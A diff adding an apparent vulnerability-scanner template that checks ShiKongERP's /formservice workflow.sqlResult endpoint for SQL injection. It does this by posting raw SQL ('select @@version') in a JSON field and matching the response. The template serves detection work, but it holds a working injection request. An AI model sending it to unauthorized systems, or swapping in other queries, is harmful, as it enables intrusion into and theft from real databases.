@@ -1,0 +1,34 @@
+id: ShiKongERP-sqlResult-SqlInjection
+
+info:
+  name: ShiKongERP SQL Injection
+  author: iSee857
+  severity: high
+  description: |
+    ShiKongERP SQL Injection vulnerability allows attackers to execute arbitrary SQL commands.
+
+http:
+  - raw:
+      - |
+        POST /formservice?service=workflow.sqlResult HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json; charset=utf-8
+
+        {
+          "params": {
+            "hello": "world"
+          },
+          "sql": "select @@version"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<root>'
+          - 'Copyright'
+        condition: and
+
+      - type: status
+        status:
+          - 200
